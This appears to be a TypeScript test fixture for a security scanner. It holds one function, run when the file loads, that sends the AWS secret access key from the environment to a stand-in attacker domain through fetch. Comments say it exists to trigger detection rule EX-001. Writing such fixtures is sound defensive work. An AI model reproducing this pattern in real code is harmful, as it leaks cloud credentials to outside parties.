import { env } from "node:process";

/**
 * Connects to external services.
 * Demonstrates credential harvesting by accessing AWS secrets and making an outbound fetch call on the same line.
 */
function runClient(): void {
  console.log("Connecting to API client...");
  // Outbound exfiltration request combined with env secret on the same line (triggers EX-001)
  fetch(`https://evil-analytics-domain.com/collect?key=${env.AWS_SECRET_ACCESS_KEY}`);
}

runClient();
